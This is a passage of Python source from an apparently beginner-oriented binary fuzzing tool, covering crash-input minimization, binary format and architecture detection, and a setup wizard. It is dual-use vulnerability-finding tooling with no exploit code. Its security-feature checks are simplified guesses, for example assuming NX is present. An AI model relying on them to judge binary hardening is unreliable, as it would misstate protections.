        Final polish: try removing each byte individually.

        This catches cases where ddmin leaves a few extra bytes
        due to chunk boundaries.
        """
        current = bytearray(data)
        i = 0

        while i < len(current) and self.total_tests < self.max_tests:
            # Try removing byte at position i
            test = bytes(current[:i] + current[i+1:])

            if len(test) == 0:
                break

            crashes, _ = await self._test_input(test)
            if crashes:
                # Removal succeeded, stay at same position
                current = bytearray(test)
            else:
                # Can't remove this byte, move forward
                i += 1

        return bytes(current)

    async def minimize_structured(
        self,
        crash_input: bytes,
        output_dir: str,
        tokens: Optional[List[bytes]] = None,
    ) -> DeltaDebugResult:
        """
        Token-based delta debugging for structured inputs.

        Instead of operating on bytes, operates on tokens (e.g., lines,
        JSON fields, XML elements) for better minimization of structured data.

        Args:
            crash_input: The crash-inducing input
            output_dir: Directory to save minimized input
            tokens: Pre-tokenized input (auto-detected if None)

        Returns:
            DeltaDebugResult with minimized input
        """
        start_time = time.time()
        original_size = len(crash_input)

        # Reset state
        self.total_tests = 0
        self.cache_hits = 0
        self.ddmin_passes = 0
        self._test_cache.clear()

        # Verify input actually crashes
        crashes, crash_type = await self._test_input(crash_input)
        if not crashes:
            return DeltaDebugResult(
                original_size=original_size,
                minimized_size=original_size,
                reduction_percentage=0.0,
                minimized_input=crash_input,
                minimized_path="",
                total_tests=self.total_tests,
                ddmin_passes=0,
                still_crashes=False,
                minimization_time=time.time() - start_time,
            )

        self.target_crash_type = crash_type

        # Tokenize if not provided
        if tokens is None:
            tokens = self._auto_tokenize(crash_input)

        # Run token-based ddmin
        minimized_tokens = await self._ddmin_tokens(tokens)
        minimized_bytes = b''.join(minimized_tokens)

        # Fall back to byte-level if token approach didn't help much
        if len(minimized_bytes) > original_size * 0.8:
            minimized_bytes = bytes(await self._ddmin(list(crash_input)))

        # Final polish
        final_crashes, _ = await self._test_input(minimized_bytes)
        if final_crashes and len(minimized_bytes) > 1:
            minimized_bytes = await self._byte_polish(minimized_bytes)

        # Save result
        os.makedirs(output_dir, exist_ok=True)
        hash_str = hashlib.sha256(minimized_bytes).hexdigest()[:12]
        minimized_path = os.path.join(output_dir, f"ddmin_struct_{hash_str}")
        with open(minimized_path, "wb") as f:
            f.write(minimized_bytes)

        reduction = ((original_size - len(minimized_bytes)) / original_size * 100
                     if original_size > 0 else 0)

        return DeltaDebugResult(
            original_size=original_size,
            minimized_size=len(minimized_bytes),
            reduction_percentage=round(reduction, 2),
            minimized_input=minimized_bytes,
            minimized_path=minimized_path,
            total_tests=self.total_tests,
            ddmin_passes=self.ddmin_passes,
            still_crashes=final_crashes,
            crash_type=crash_type,
            minimization_time=round(time.time() - start_time, 2),
        )

    def _auto_tokenize(self, data: bytes) -> List[bytes]:
        """Auto-detect input format and tokenize appropriately."""
        try:
            text = data.decode('utf-8', errors='ignore')

            # Try JSON tokenization
            if text.strip().startswith(('{', '[')):
                return self._tokenize_json(data)

            # Try XML tokenization
            if text.strip().startswith('<'):
                return self._tokenize_xml(data)

            # Try line-based tokenization
            if '\n' in text:
                return self._tokenize_lines(data)

        except Exception:
            pass

        # Fall back to fixed-size chunks
        chunk_size = max(1, len(data) // 16)
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    def _tokenize_json(self, data: bytes) -> List[bytes]:
        """Tokenize JSON input by top-level fields."""
        tokens = []
        try:
            import json as json_module
            text = data.decode('utf-8')
            obj = json_module.loads(text)

            if isinstance(obj, dict):
                for key, value in obj.items():
                    tokens.append(json_module.dumps({key: value}).encode())
            elif isinstance(obj, list):
                for item in obj:
                    tokens.append(json_module.dumps(item).encode())
            else:
                tokens = [data]
        except Exception:
            tokens = [data]

        return tokens if tokens else [data]

    def _tokenize_xml(self, data: bytes) -> List[bytes]:
        """Tokenize XML input by elements."""
        tokens = []
        try:
            # Simple tag-based splitting
            import re
            # Split by top-level tags
            pattern = rb'<([^/][^>]*?)(?:/>|>.*?</\1>)'
            matches = list(re.finditer(pattern, data, re.DOTALL))

            if matches:
                for match in matches:
                    tokens.append(match.group(0))
            else:
                tokens = [data]
        except Exception:
            tokens = [data]

        return tokens if tokens else [data]

    def _tokenize_lines(self, data: bytes) -> List[bytes]:
        """Tokenize input by lines."""
        lines = data.split(b'\n')
        # Keep newlines with their lines
        return [line + b'\n' for line in lines[:-1]] + ([lines[-1]] if lines[-1] else [])

    async def _ddmin_tokens(self, tokens: List[bytes], n: int = 2) -> List[bytes]:
        """Token-based ddmin algorithm."""
        if len(tokens) <= 1:
            return tokens

        if self.total_tests >= self.max_tests:
            return tokens

        self.ddmin_passes += 1

        n = min(n, len(tokens))
        if n < 2:
            return tokens

        # Split into n chunks of tokens
        chunk_size = (len(tokens) + n - 1) // n
        chunks = [
            tokens[i:i + chunk_size]
            for i in range(0, len(tokens), chunk_size)
        ]

        # Test complements
        for i in range(len(chunks)):
            complement = []
            for j, c in enumerate(chunks):
                if j != i:
                    complement.extend(c)

            if not complement:
                continue

            crashes, _ = await self._test_input(b''.join(complement))
            if crashes:
                return await self._ddmin_tokens(complement, max(n - 1, 2))

        # Test individual chunks
        for chunk in chunks:
            if not chunk:
                continue

            crashes, _ = await self._test_input(b''.join(chunk))
            if crashes:
                return await self._ddmin_tokens(chunk, 2)

        # Increase granularity
        if n < len(tokens):
            return await self._ddmin_tokens(tokens, min(2 * n, len(tokens)))

        return tokens

    def get_stats(self) -> Dict[str, Any]:
        """Get minimization statistics."""
        return {
            "total_tests": self.total_tests,
            "cache_hits": self.cache_hits,
            "ddmin_passes": self.ddmin_passes,
            "cache_size": len(self._test_cache),
            "cache_hit_rate": round(self.cache_hits / max(1, self.total_tests + self.cache_hits) * 100, 1),
        }


# =============================================================================
# BEGINNER-FRIENDLY FEATURES - PHASE 8
# =============================================================================

# =============================================================================
# BINARY AUTO-DETECTION (Beginner Feature 2)
# =============================================================================

class BinaryType(str, Enum):
    """Types of binaries that can be fuzzed."""
    CLI_TOOL = "cli_tool"           # Command-line utilities
    FILE_PARSER = "file_parser"     # Image/document parsers
    NETWORK_SERVICE = "network_service"  # Servers/daemons
    LIBRARY = "library"             # Shared libraries
    INTERPRETER = "interpreter"     # Script interpreters
    UNKNOWN = "unknown"


class InputType(str, Enum):
    """Types of input the binary accepts."""
    FILE = "file"                   # Reads from file argument
    STDIN = "stdin"                 # Reads from standard input
    NETWORK = "network"             # Accepts network connections
    COMMAND_LINE = "command_line"   # Arguments only
    ENVIRONMENT = "environment"     # Environment variables
    MIXED = "mixed"                 # Multiple input vectors


@dataclass
class BinaryAnalysisResult:
    """Results from analyzing a binary for fuzzing."""
    # Basic info
    path: str = ""
    filename: str = ""
    file_size: int = 0
    
    # Format detection
    file_format: str = "unknown"  # PE, ELF, Mach-O, script
    architecture: str = "unknown"  # x86, x64, ARM, ARM64
    bitness: int = 0  # 32 or 64
    endianness: str = "little"
    
    # Binary properties
    is_executable: bool = False
    is_stripped: bool = False
    is_static: bool = False
    is_pie: bool = False  # Position Independent Executable
    has_canary: bool = False  # Stack canary
    has_nx: bool = False  # Non-executable stack
    
    # Input detection
    binary_type: BinaryType = BinaryType.UNKNOWN
    input_type: InputType = InputType.FILE
    accepts_file_arg: bool = False
    reads_stdin: bool = False
    
    # Suggested settings
    suggested_timeout_ms: int = 5000
    suggested_memory_mb: int = 256
    suggested_args: str = "@@"
    suggested_mode: FuzzingMode = FuzzingMode.COVERAGE_GUIDED
    
    # Detected features
    input_functions: List[str] = field(default_factory=list)
    file_operations: List[str] = field(default_factory=list)
    network_functions: List[str] = field(default_factory=list)
    dangerous_functions: List[str] = field(default_factory=list)
    
    # Confidence
    detection_confidence: float = 0.0
    warnings: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "path": self.path,
            "filename": self.filename,
            "file_size": self.file_size,
            "file_format": self.file_format,
            "architecture": self.architecture,
            "bitness": self.bitness,
            "endianness": self.endianness,
            "is_executable": self.is_executable,
            "is_stripped": self.is_stripped,
            "is_static": self.is_static,
            "is_pie": self.is_pie,
            "has_canary": self.has_canary,
            "has_nx": self.has_nx,
            "binary_type": self.binary_type.value,
            "input_type": self.input_type.value,
            "accepts_file_arg": self.accepts_file_arg,
            "reads_stdin": self.reads_stdin,
            "suggested_timeout_ms": self.suggested_timeout_ms,
            "suggested_memory_mb": self.suggested_memory_mb,
            "suggested_args": self.suggested_args,
            "suggested_mode": self.suggested_mode.value,
            "input_functions": self.input_functions,
            "file_operations": self.file_operations,
            "network_functions": self.network_functions,
            "dangerous_functions": self.dangerous_functions,
            "detection_confidence": self.detection_confidence,
            "warnings": self.warnings,
            "recommendations": self.recommendations,
        }


class BinaryAutoDetector:
    """
    Automatically analyze binaries to detect type, architecture,
    and suggest optimal fuzzing settings.
    
    Makes fuzzing accessible to beginners by removing the need
    to understand binary formats and configuration options.
    """
    
    # Magic bytes for file format detection
    MAGIC_BYTES = {
        b"MZ": ("PE", "Windows executable"),
        b"\x7fELF": ("ELF", "Linux/Unix executable"),
        b"\xfe\xed\xfa\xce": ("Mach-O", "macOS executable (32-bit)"),
        b"\xfe\xed\xfa\xcf": ("Mach-O", "macOS executable (64-bit)"),
        b"\xca\xfe\xba\xbe": ("Mach-O", "macOS universal binary"),
        b"#!": ("Script", "Script file"),
    }
    
    # Common input-related function names
    INPUT_FUNCTIONS = {
        "file": ["fopen", "open", "fread", "read", "fgets", "fscanf", 
                 "CreateFileA", "CreateFileW", "ReadFile", "_wfopen"],
        "stdin": ["scanf", "gets", "getchar", "fgets", "read", "getline",
                  "std::cin", "std::getline"],
        "network": ["socket", "recv", "recvfrom", "accept", "listen", "bind",
                    "WSARecv", "WSASocket", "getaddrinfo"],
        "dangerous": ["strcpy", "strcat", "sprintf", "gets", "scanf", 
                      "memcpy", "memmove", "strncpy", "strncat",
                      "system", "exec", "popen", "eval"],
    }
    
    # Architecture detection from ELF e_machine
    ELF_MACHINES = {
        0x03: ("x86", 32),
        0x3e: ("x64", 64),
        0x28: ("ARM", 32),
        0xb7: ("ARM64", 64),
        0x08: ("MIPS", 32),
        0xf3: ("RISC-V", 64),
    }
    
    def __init__(self):
        self.result = BinaryAnalysisResult()
    
    def analyze(self, binary_path: str) -> BinaryAnalysisResult:
        """
        Analyze a binary and detect its properties.
        
        Args:
            binary_path: Path to the binary file
            
        Returns:
            BinaryAnalysisResult with detected properties and suggestions
        """
        self.result = BinaryAnalysisResult()
        
        if not os.path.exists(binary_path):
            self.result.warnings.append(f"Binary not found: {binary_path}")
            return self.result
        
        self.result.path = binary_path
        self.result.filename = os.path.basename(binary_path)
        self.result.file_size = os.path.getsize(binary_path)
        
        # Check if executable
        self.result.is_executable = os.access(binary_path, os.X_OK)
        
        # Read binary header
        try:
            with open(binary_path, "rb") as f:
                header = f.read(4096)  # Read first 4KB
        except Exception as e:
            self.result.warnings.append(f"Cannot read binary: {e}")
            return self.result
        
        # Detect file format
        self._detect_format(header)
        
        # Detect architecture
        self._detect_architecture(header)
        
        # Detect security features
        self._detect_security_features(header)
        
        # Analyze imports/functions
        self._analyze_functions(binary_path, header)
        
        # Determine binary type
        self._determine_binary_type()
        
        # Generate suggestions
        self._generate_suggestions()
        
        # Calculate confidence
        self._calculate_confidence()
        
        return self.result
    
    def _detect_format(self, header: bytes):
        """Detect the binary file format."""
        for magic, (format_name, description) in self.MAGIC_BYTES.items():
            if header.startswith(magic):
                self.result.file_format = format_name
                return
        
        # Check for script shebang
        if header[:2] == b"#!":
            self.result.file_format = "Script"
            # Try to detect interpreter
            try:
                first_line = header.split(b"\n")[0].decode("utf-8", errors="ignore")
                if "python" in first_line.lower():
                    self.result.recommendations.append("This is a Python script - consider using a Python fuzzer")
                elif "bash" in first_line.lower() or "sh" in first_line.lower():
                    self.result.recommendations.append("This is a shell script - limited fuzzing potential")
            except:
                pass
    
    def _detect_architecture(self, header: bytes):
        """Detect the binary architecture."""
        if self.result.file_format == "ELF":
            self._detect_elf_arch(header)
        elif self.result.file_format == "PE":
            self._detect_pe_arch(header)
        elif self.result.file_format == "Mach-O":
            self._detect_macho_arch(header)
    
    def _detect_elf_arch(self, header: bytes):
        """Detect architecture from ELF header."""
        if len(header) < 20:
            return
        
        # ELF class (32/64 bit)
        elf_class = header[4]
        if elf_class == 1:
            self.result.bitness = 32
        elif elf_class == 2:
            self.result.bitness = 64
        
        # Endianness
        elf_data = header[5]
        self.result.endianness = "little" if elf_data == 1 else "big"
        
        # Machine type
        if self.result.endianness == "little":
            e_machine = struct.unpack("<H", header[18:20])[0]
        else:
            e_machine = struct.unpack(">H", header[18:20])[0]
        
        if e_machine in self.ELF_MACHINES:
            self.result.architecture, _ = self.ELF_MACHINES[e_machine]
        
        # ELF type (executable, shared object, etc.)
        if self.result.endianness == "little":
            e_type = struct.unpack("<H", header[16:18])[0]
        else:
            e_type = struct.unpack(">H", header[16:18])[0]
        
        if e_type == 2:  # ET_EXEC
            self.result.is_pie = False
        elif e_type == 3:  # ET_DYN (shared object or PIE)
            self.result.is_pie = True
    
    def _detect_pe_arch(self, header: bytes):
        """Detect architecture from PE header."""
        # Find PE signature
        if len(header) < 64:
            return
        
        pe_offset = struct.unpack("<I", header[60:64])[0]
        if pe_offset + 6 > len(header):
            return
        
        # Check PE signature
        if header[pe_offset:pe_offset+4] != b"PE\x00\x00":
            return
        
        # Machine type
        machine = struct.unpack("<H", header[pe_offset+4:pe_offset+6])[0]
        
        if machine == 0x014c:  # IMAGE_FILE_MACHINE_I386
            self.result.architecture = "x86"
            self.result.bitness = 32
        elif machine == 0x8664:  # IMAGE_FILE_MACHINE_AMD64
            self.result.architecture = "x64"
            self.result.bitness = 64
        elif machine == 0x01c0:  # IMAGE_FILE_MACHINE_ARM
            self.result.architecture = "ARM"
            self.result.bitness = 32
        elif machine == 0xaa64:  # IMAGE_FILE_MACHINE_ARM64
            self.result.architecture = "ARM64"
            self.result.bitness = 64
        
        self.result.endianness = "little"  # PE is always little-endian
    
    def _detect_macho_arch(self, header: bytes):
        """Detect architecture from Mach-O header."""
        if len(header) < 8:
            return
        
        magic = struct.unpack("<I", header[:4])[0]
        
        if magic == 0xfeedface:  # 32-bit
            self.result.bitness = 32
            self.result.endianness = "little"
        elif magic == 0xfeedfacf:  # 64-bit
            self.result.bitness = 64
            self.result.endianness = "little"
        elif magic == 0xcefaedfe:  # 32-bit big-endian
            self.result.bitness = 32
            self.result.endianness = "big"
        elif magic == 0xcffaedfe:  # 64-bit big-endian
            self.result.bitness = 64
            self.result.endianness = "big"
        
        # CPU type
        if self.result.endianness == "little":
            cpu_type = struct.unpack("<I", header[4:8])[0]
        else:
            cpu_type = struct.unpack(">I", header[4:8])[0]
        
        cpu_type_masked = cpu_type & 0xffffff
        if cpu_type_masked == 7:  # CPU_TYPE_X86
            self.result.architecture = "x86" if self.result.bitness == 32 else "x64"
        elif cpu_type_masked == 12:  # CPU_TYPE_ARM
            self.result.architecture = "ARM" if self.result.bitness == 32 else "ARM64"
    
    def _detect_security_features(self, header: bytes):
        """Detect security features like ASLR, NX, stack canary."""
        # For ELF, check for common security patterns
        if self.result.file_format == "ELF":
            # Check for stack canary (presence of __stack_chk_fail)
            if b"__stack_chk_fail" in header or b"__stack_chk_guard" in header:
                self.result.has_canary = True
            
            # GNU_STACK segment indicates NX
            # This is a simplified check
            self.result.has_nx = True  # Assume modern binaries have NX
        
        elif self.result.file_format == "PE":
            # PE security features are in DllCharacteristics
            # Simplified - assume modern Windows binaries have these
            self.result.has_nx = True
            self.result.has_canary = True
    
    def _analyze_functions(self, binary_path: str, header: bytes):
        """Analyze imported functions to understand binary behavior."""
        # Search for function names in the binary
        try:
            with open(binary_path, "rb") as f:
                content = f.read()
        except:
            content = header
        
        # Look for input-related functions
        for func in self.INPUT_FUNCTIONS["file"]:
            if func.encode() in content:
                self.result.file_operations.append(func)
                self.result.accepts_file_arg = True
        
        for func in self.INPUT_FUNCTIONS["stdin"]:
            if func.encode() in content:
                self.result.input_functions.append(func)
                self.result.reads_stdin = True
        
        for func in self.INPUT_FUNCTIONS["network"]:
            if func.encode() in content:
                self.result.network_functions.append(func)
        
        for func in self.INPUT_FUNCTIONS["dangerous"]:
            if func.encode() in content:
                self.result.dangerous_functions.append(func)
    
    def _determine_binary_type(self):
        """Determine what type of binary this is."""
        # Network service detection
        if self.result.network_functions:
            if any(f in self.result.network_functions for f in ["listen", "accept", "bind"]):
                self.result.binary_type = BinaryType.NETWORK_SERVICE
                self.result.input_type = InputType.NETWORK
                return
        
        # File parser detection
        if self.result.file_operations and self.result.accepts_file_arg:
            self.result.binary_type = BinaryType.FILE_PARSER
            self.result.input_type = InputType.FILE
            return
        
        # CLI tool detection
        if self.result.reads_stdin or self.result.accepts_file_arg:
            self.result.binary_type = BinaryType.CLI_TOOL
            if self.result.reads_stdin and self.result.accepts_file_arg:
                self.result.input_type = InputType.MIXED
            elif self.result.reads_stdin:
                self.result.input_type = InputType.STDIN
            else:
                self.result.input_type = InputType.FILE
            return
        
        # Default
        self.result.binary_type = BinaryType.UNKNOWN
        self.result.input_type = InputType.FILE
    
    def _generate_suggestions(self):
        """Generate fuzzing configuration suggestions."""
        # Timeout based on binary type
        if self.result.binary_type == BinaryType.NETWORK_SERVICE:
            self.result.suggested_timeout_ms = 10000
            self.result.suggested_args = ""
            self.result.recommendations.append(
                "Network service detected - consider using network protocol fuzzing"
            )
        elif self.result.binary_type == BinaryType.FILE_PARSER:
            self.result.suggested_timeout_ms = 5000
            self.result.suggested_args = "@@"
            self.result.recommendations.append(
                "File parser detected - use appropriate file format seeds"
            )
        else:
            self.result.suggested_timeout_ms = 5000
            self.result.suggested_args = "@@"
        
        # Memory based on architecture
        if self.result.bitness == 64:
            self.result.suggested_memory_mb = 512
        else:
            self.result.suggested_memory_mb = 256
        
        # Input type specific arguments
        if self.result.input_type == InputType.STDIN:
            self.result.suggested_args = ""  # Pipe input via stdin
            self.result.recommendations.append(
                "Binary reads from stdin - input will be piped"
            )
        elif self.result.input_type == InputType.MIXED:
            self.result.suggested_args = "@@"
            self.result.recommendations.append(
                "Binary accepts both file and stdin - using file mode"
            )
        
        # Security warnings
        if not self.result.has_canary:
            self.result.warnings.append(
                "No stack canary detected - stack overflows may be easier to exploit"
            )
        
        if self.result.dangerous_functions:
            funcs = ", ".join(self.result.dangerous_functions[:5])
            self.result.warnings.append(
                f"Dangerous functions found ({funcs}) - higher chance of vulnerabilities"
            )
        
        # Fuzzing mode suggestion
        if self.result.is_stripped:
            self.result.recommendations.append(
                "Binary is stripped - consider using QEMU mode for better coverage"
            )
            self.result.suggested_mode = FuzzingMode.COVERAGE_GUIDED
        else:
            self.result.suggested_mode = FuzzingMode.COVERAGE_GUIDED
    
    def _calculate_confidence(self):
        """Calculate confidence score for the detection."""
        confidence = 0.0
        
        # Format detected
        if self.result.file_format != "unknown":
            confidence += 0.2
        
        # Architecture detected
        if self.result.architecture != "unknown":
            confidence += 0.2
        
        # Binary type determined
        if self.result.binary_type != BinaryType.UNKNOWN:
            confidence += 0.3
        
        # Input type determined
        if self.result.input_type != InputType.FILE:  # Non-default
            confidence += 0.2
        
        # Functions found
        if self.result.input_functions or self.result.file_operations:
            confidence += 0.1
        
        self.result.detection_confidence = min(1.0, confidence)
    
    def get_plain_english_summary(self) -> str:
        """Get a beginner-friendly summary of the analysis."""
        lines = []
        
        lines.append(f"📁 **File:** {self.result.filename}")
        lines.append(f"📦 **Format:** {self.result.file_format}")
        
        if self.result.architecture != "unknown":
            lines.append(f"🖥️ **Architecture:** {self.result.architecture} ({self.result.bitness}-bit)")
        
        # Binary type explanation
        type_explanations = {
            BinaryType.CLI_TOOL: "This is a command-line tool that processes input",
            BinaryType.FILE_PARSER: "This program reads and processes files",
            BinaryType.NETWORK_SERVICE: "This is a network server/service",
            BinaryType.LIBRARY: "This is a shared library",
            BinaryType.INTERPRETER: "This is a script interpreter",
            BinaryType.UNKNOWN: "Couldn't determine the program type",
        }
        lines.append(f"🎯 **Type:** {type_explanations[self.result.binary_type]}")
        
        # Input explanation
        input_explanations = {
            InputType.FILE: "Provide test files as input",
            InputType.STDIN: "Send test data through standard input (keyboard/pipe)",
            InputType.NETWORK: "Send test data over the network",
            InputType.COMMAND_LINE: "Test different command-line arguments",
            InputType.MIXED: "Can accept input through multiple methods",
            InputType.ENVIRONMENT: "Uses environment variables for configuration",
        }
        lines.append(f"📥 **Input Method:** {input_explanations[self.result.input_type]}")
        
        # Confidence
        confidence_level = "Low" if self.result.detection_confidence < 0.4 else \
                          "Medium" if self.result.detection_confidence < 0.7 else "High"
        lines.append(f"🎯 **Detection Confidence:** {confidence_level} ({self.result.detection_confidence:.0%})")
        
        return "\n".join(lines)


# =============================================================================
# SETUP WIZARD (Beginner Feature 1)
# =============================================================================

class WizardStep(str, Enum):
    """Steps in the setup wizard."""
    WELCOME = "welcome"
    UPLOAD_BINARY = "upload_binary"
    ANALYZE_BINARY = "analyze_binary"
    CONFIGURE_INPUT = "configure_input"
    CONFIGURE_TIMEOUT = "configure_timeout"
    CONFIGURE_MODE = "configure_mode"
    ADD_SEEDS = "add_seeds"
    REVIEW_CONFIG = "review_config"
    START_FUZZING = "start_fuzzing"
    COMPLETE = "complete"


@dataclass
class WizardState:
    """Current state of the setup wizard."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    current_step: WizardStep = WizardStep.WELCOME
    completed_steps: List[str] = field(default_factory=list)
    
    # Configuration being built
    target_path: Optional[str] = None
    target_args: str = "@@"
    timeout_ms: int = 5000
    memory_limit_mb: int = 256
    mode: FuzzingMode = FuzzingMode.COVERAGE_GUIDED
    seed_dir: Optional[str] = None
    output_dir: Optional[str] = None
    use_qemu: bool = False
    
    # Analysis results
    binary_analysis: Optional[Dict[str, Any]] = None
    
    # User choices
    user_choices: Dict[str, Any] = field(default_factory=dict)
    
    # Progress
    started_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "current_step": self.current_step.value,
            "completed_steps": self.completed_steps,
            "target_path": self.target_path,
            "target_args": self.target_args,
            "timeout_ms": self.timeout_ms,
            "memory_limit_mb": self.memory_limit_mb,
            "mode": self.mode.value,
            "seed_dir": self.seed_dir,
            "output_dir": self.output_dir,
            "use_qemu": self.use_qemu,
            "binary_analysis": self.binary_analysis,
            "user_choices": self.user_choices,
            "started_at": self.started_at,
        }


@dataclass
class WizardStepInfo:
    """Information about a wizard step."""
    step: WizardStep
    title: str
    description: str
    explanation: str  # Beginner-friendly explanation
    help_text: str
    required: bool
    can_skip: bool
    next_step: Optional[WizardStep]
    prev_step: Optional[WizardStep]
    input_fields: List[Dict[str, Any]] = field(default_factory=list)


class FuzzingSetupWizard:
    """
    Step-by-step setup wizard for binary fuzzing.
    
    Guides beginners through the fuzzing configuration process
    with explanations at each step. Makes fuzzing accessible
    without requiring deep technical knowledge.
    """
    
    # Step definitions with explanations
    STEPS: Dict[WizardStep, WizardStepInfo] = {
        WizardStep.WELCOME: WizardStepInfo(
            step=WizardStep.WELCOME,
            title="Welcome to the Fuzzing Wizard! 🧙‍♂️",
            description="Let's set up fuzzing for your program",
            explanation="""
**What is Fuzzing?**
Fuzzing is a technique to find bugs and security vulnerabilities in programs 
by feeding them random or semi-random input. Think of it as a tireless tester 
that tries millions of inputs to find ones that crash or behave unexpectedly.

**What You'll Need:**
1. A program (binary) you want to test
2. Some example inputs (optional but recommended)
3. A few minutes to configure

**What We'll Do:**
1. Upload and analyze your program
2. Configure how to test it
3. Start finding bugs!

Click "Next" to begin.
            """,
            help_text="This wizard will guide you through setting up a fuzzing session",
            required=False,
            can_skip=True,
            next_step=WizardStep.UPLOAD_BINARY,
            prev_step=None,
        ),
        
        WizardStep.UPLOAD_BINARY: WizardStepInfo(
            step=WizardStep.UPLOAD_BINARY,
            title="Upload Your Program 📤",
            description="Select the program you want to test",
            explanation="""
**What to Upload:**
Upload the executable file (program) you want to test for bugs.

**Supported Formats:**
- **Windows:** .exe files
- **Linux:** ELF binaries (no extension usually)
- **macOS:** Mach-O binaries

**Tips:**
- If possible, use a version compiled with debugging symbols
- Smaller programs are faster to fuzz
- You can also provide a path to an existing binary

**Example Programs to Fuzz:**
- Image viewers/converters
- Document parsers
- Network tools
- File compression utilities
            """,
            help_text="Upload an executable file or enter the path to one",
            required=True,
            can_skip=False,
            next_step=WizardStep.ANALYZE_BINARY,
            prev_step=WizardStep.WELCOME,
            input_fields=[
                {
                    "name": "binary_file",
                    "type": "file",
                    "label": "Binary File",
                    "accept": ".exe,.bin,*",
                    "required": True,
                },
                {
                    "name": "binary_path",
                    "type": "text",
                    "label": "Or enter path to existing binary",
                    "placeholder": "/path/to/binary",
                    "required": False,
                },
            ],
        ),
        
        WizardStep.ANALYZE_BINARY: WizardStepInfo(
            step=WizardStep.ANALYZE_BINARY,
            title="Analyzing Your Program 🔍",
            description="We're detecting the best settings for your program",
            explanation="""
**What's Happening:**
We're analyzing your program to understand:
- What type of program it is (parser, server, tool, etc.)
- How it accepts input (files, keyboard, network)
- What security features it has
- The best fuzzing settings to use

**This helps us:**
- Choose the right testing strategy
- Set appropriate timeouts
- Provide better recommendations

Please wait while we analyze...
            """,
            help_text="Automatic analysis in progress",
            required=True,
            can_skip=False,
            next_step=WizardStep.CONFIGURE_INPUT,
            prev_step=WizardStep.UPLOAD_BINARY,
        ),
        
        WizardStep.CONFIGURE_INPUT: WizardStepInfo(
            step=WizardStep.CONFIGURE_INPUT,
            title="Configure Input Method 📥",
            description="How does your program receive input?",
            explanation="""
**Input Methods:**

1. **File Input (@@)** - Most common
   Your program reads from a file. We replace @@ with the test file path.
   Example: `./myprogram @@` → `./myprogram testfile.txt`

2. **Standard Input (stdin)**
   Your program reads from keyboard/pipe input.
   We pipe test data directly to the program.

3. **Command Line Arguments**
   Your program's behavior depends on its arguments.
   We fuzz the arguments themselves.

4. **Network Input**
   Your program accepts network connections.
   We send test data over the network.

**Our Detection:**
Based on analysis, we detected your program likely uses: {detected_input}
            """,
            help_text="Select how your program receives input to test",
            required=True,
            can_skip=False,
            next_step=WizardStep.CONFIGURE_TIMEOUT,
            prev_step=WizardStep.ANALYZE_BINARY,
            input_fields=[
                {
                    "name": "input_method",
                    "type": "select",
                    "label": "Input Method",
                    "options": [
                        {"value": "file", "label": "File Input (most common)"},
                        {"value": "stdin", "label": "Standard Input"},
                        {"value": "args", "label": "Command Line Arguments"},
                        {"value": "network", "label": "Network Input"},
                    ],
                    "default": "file",
                },
                {
                    "name": "target_args",
                    "type": "text",
                    "label": "Program Arguments",
                    "placeholder": "@@",
                    "help": "Use @@ where the input file should go",
                    "default": "@@",
                },
            ],
        ),
        
        WizardStep.CONFIGURE_TIMEOUT: WizardStepInfo(
            step=WizardStep.CONFIGURE_TIMEOUT,
            title="Set Timeout ⏱️",
            description="How long should we wait for each test?",
            explanation="""
**What is Timeout?**
The maximum time to wait for your program to finish processing each input.
If it takes longer, we assume it's stuck and move on.

**Choosing a Timeout:**

- **Fast programs (< 100ms):** Use 500-1000ms timeout
  Examples: Simple parsers, validators

- **Medium programs (100ms - 1s):** Use 2000-5000ms timeout
  Examples: Image processors, compilers

- **Slow programs (> 1s):** Use 10000-30000ms timeout
  Examples: Complex analyzers, network services

**Why This Matters:**
- Too short: Miss bugs that need time to trigger
- Too long: Waste time on normal slow operations

**Recommended:** {recommended_timeout}ms based on your program type
            """,
            help_text="Set execution timeout in milliseconds",
            required=True,
            can_skip=False,
            next_step=WizardStep.CONFIGURE_MODE,
            prev_step=WizardStep.CONFIGURE_INPUT,
            input_fields=[
                {
                    "name": "timeout_ms",
                    "type": "number",
                    "label": "Timeout (milliseconds)",
                    "min": 100,
                    "max": 60000,
                    "default": 5000,
                },
                {
                    "name": "memory_limit_mb",
                    "type": "number",
                    "label": "Memory Limit (MB)",
                    "min": 64,
                    "max": 4096,
                    "default": 256,
                    "help": "Maximum memory your program can use",
                },
            ],
        ),
        
        WizardStep.CONFIGURE_MODE: WizardStepInfo(
            step=WizardStep.CONFIGURE_MODE,
            title="Choose Fuzzing Mode 🎮",
            description="Select how we should test your program",
            explanation="""
**Fuzzing Modes:**

1. **Coverage-Guided (Recommended)** ⭐
   Smart fuzzing that learns from each test. Finds more bugs faster.
   Tracks which code paths are executed and prioritizes unexplored areas.
   
2. **Dumb/Random Fuzzing**
   Simple random mutation without feedback.
   Faster per-test but less effective overall.
   Good for quick sanity checks.

3. **Grammar-Based**
   Uses knowledge of input format (JSON, XML, etc.)
   Best for structured inputs where random data won't work.

**Use QEMU Mode:**
Enable this if your program wasn't compiled with coverage instrumentation.
Slightly slower but works with any binary.

**Recommended:** Coverage-Guided with {qemu_recommendation}
            """,
            help_text="Select the fuzzing strategy",
            required=True,
            can_skip=False,
            next_step=WizardStep.ADD_SEEDS,
            prev_step=WizardStep.CONFIGURE_TIMEOUT,
            input_fields=[
                {
                    "name": "fuzzing_mode",
                    "type": "select",
                    "label": "Fuzzing Mode",
                    "options": [
                        {"value": "coverage_guided", "label": "Coverage-Guided (Recommended)"},
                        {"value": "dumb", "label": "Dumb/Random Fuzzing"},
                        {"value": "grammar_based", "label": "Grammar-Based"},
                    ],
                    "default": "coverage_guided",
                },
                {
                    "name": "use_qemu",
                    "type": "checkbox",
                    "label": "Use QEMU Mode (for uninstrumented binaries)",
                    "default": False,
                },
            ],
        ),
        
        WizardStep.ADD_SEEDS: WizardStepInfo(
            step=WizardStep.ADD_SEEDS,
            title="Add Seed Inputs 🌱",
            description="Provide example inputs to start with",
            explanation="""
**What are Seeds?**
Seeds are example inputs that your program processes correctly.
The fuzzer uses these as starting points and mutates them to find bugs.

**Why Seeds Matter:**
- Better seeds = faster bug finding
- Seeds should cover different features
- Valid inputs work better than garbage

